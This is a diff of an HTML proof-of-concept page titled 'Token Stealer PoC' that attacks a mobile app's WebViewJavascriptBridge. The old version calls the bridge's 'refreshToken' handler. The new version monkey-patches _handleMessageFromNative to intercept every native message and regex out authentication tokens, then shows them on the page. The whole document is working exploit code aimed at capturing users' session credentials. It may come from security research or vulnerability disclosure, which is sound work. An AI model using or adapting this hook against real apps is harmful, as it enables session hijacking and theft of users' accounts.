@@ -1,40 +1,34 @@
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>Token Stealer PoC</title>
-  </head>
-  <body style="background:#111; color:#0f0; font-family:monospace;">
-    <h1>Waiting for WebViewJavascriptBridge...</h1>
-    <pre id="result">Loading...</pre>
+<body style="background:#111; color:#0f0; font-family:monospace;">
+  <pre id="log">[*] Waiting for Bridge...</pre>
+  <script>
+    function log(msg) {
+      document.getElementById('log').textContent += '\n' + msg;
+    }
 
-    <script>
-      function extractToken(data) {
-        try {
-          const json = JSON.parse(data);
-          if (json.token) return json.token;
-          const inner = JSON.parse(json); // in case token is double-wrapped
-          return inner.token || null;
-        } catch (e) {
-          return null;
-        }
+    const interval = setInterval(() => {
+      if (window.WebViewJavascriptBridge) {
+        clearInterval(interval);
+        log('[*] Bridge Detected!');
+
+        const originalHandle = WebViewJavascriptBridge._handleMessageFromNative;
+        WebViewJavascriptBridge._handleMessageFromNative = function(msg) {
+          log('[+] _handleMessageFromNative called!');
+          log('[+] Raw msg: ' + msg);
+          try {
+            const parsed = JSON.parse(msg);
+            if (parsed.responseData && typeof parsed.responseData === 'string') {
+              log('[+] responseData: ' + parsed.responseData);
+              const tokenMatch = parsed.responseData.match(/"token" *: *"([^"]+)"/);
+              if (tokenMatch) {
+                log('[!] Token Found: ' + tokenMatch[1]);
+              }
+            }
+          } catch (e) {
+            log('[x] JSON parse error: ' + e);
+          }
+          return originalHandle.call(this, msg);
+        };
       }
-
-      function tryGetToken() {
-        if (!window.WebViewJavascriptBridge) {
-          setTimeout(tryGetToken, 500);
-          return;
-        }
-
-        document.querySelector("h1").textContent = "[*] Bridge Detected!";
-        window.WebViewJavascriptBridge.callHandler("refreshToken", null, function (response) {
-          const token = extractToken(response);
-          document.getElementById("result").textContent =
-            token ? "Token:\n" + token : "Failed to extract token.";
-        });
-      }
-
-      tryGetToken();
-    </script>
-  </body>
-</html>
+    }, 500);
+  </script>
+</body>
